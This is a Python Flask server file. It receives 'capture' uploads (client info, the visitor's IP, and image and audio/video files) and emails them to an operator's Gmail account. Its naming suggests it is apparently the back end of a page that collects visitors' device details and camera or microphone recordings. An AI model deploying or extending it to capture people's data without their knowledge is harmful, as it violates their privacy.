import os
import ssl
import smtplib
import tempfile
import mimetypes
from email.message import EmailMessage
from flask import Flask, request, jsonify, render_template

app = Flask(__name__, template_folder="templates")

GMAIL_USER = os.environ.get("GMAIL_USER")
GMAIL_APP_PASSWORD = os.environ.get("GMAIL_APP_PASSWORD")
RECEIVE_TO = os.environ.get("RECEIVE_TO", GMAIL_USER)
SECRET_TOKEN = os.environ.get("SECRET_TOKEN")

MAX_FILE = 12 * 1024 * 1024
ALLOWED = {'jpg','jpeg','png','webm','mp3','m4a','wav','ogg'}

def send_email(subject, body, attachment_path=None, attachment_name=None):
    msg = EmailMessage()
    msg["From"] = GMAIL_USER
    msg["To"] = RECEIVE_TO
    msg["Subject"] = subject
    msg.set_content(body)

    if attachment_path:
        mtype, _ = mimetypes.guess_type(attachment_name)
        if not mtype:
            mtype = "application/octet-stream"
        maintype, subtype = mtype.split("/", 1)
        with open(attachment_path, "rb") as f:
            filedata = f.read()
        msg.add_attachment(filedata, maintype=maintype, subtype=subtype, filename=attachment_name)

    ctx = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ctx) as server:
        server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
        server.send_message(msg)


@app.route("/")
def index():
    return render_template("index.html", SECRET_TOKEN=SECRET_TOKEN)


@app.route("/upload", methods=["POST"])
def upload():
    token = request.form.get("token", "")
    if token != SECRET_TOKEN:
        return jsonify({"ok": False, "err": "bad token"}), 401

    typ = request.form.get("type", "")

    if typ == "info":
        info = request.form.get("info", "")
        remote = request.remote_addr
        subject = "[Capture Info] Client Connected"
        body = f"Client Info:\n{info}\n\nServer Observed IP: {remote}"
        try:
            send_email(subject, body)
            return jsonify({"ok": True}), 200
        except Exception as e:
            return jsonify({"ok": False, "err": str(e)}), 500

    if "file" not in request.files:
        return jsonify({"ok": False, "err": "no file"}), 400

    f = request.files["file"]
    fname = f.filename
    ext = fname.split(".")[-1].lower()

    if ext not in ALLOWED:
        return jsonify({"ok": False, "err": "bad ext"}), 415

    f.seek(0, 2)
    size = f.tell()
    f.seek(0)

    if size > MAX_FILE:
        return jsonify({"ok": False, "err": "file too large"}), 413

    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        tmp_name = tmp.name
        f.save(tmp_name)

    subject = f"[Capture] New File: {fname}"
    body = f"File received: {fname}\nSize: {size} bytes"

    try:
        send_email(subject, body, tmp_name, fname)
    finally:
        try: os.remove(tmp_name)
        except: pass

    return jsonify({"ok": True}), 200


if __name__ == "__main__":
    app.run()
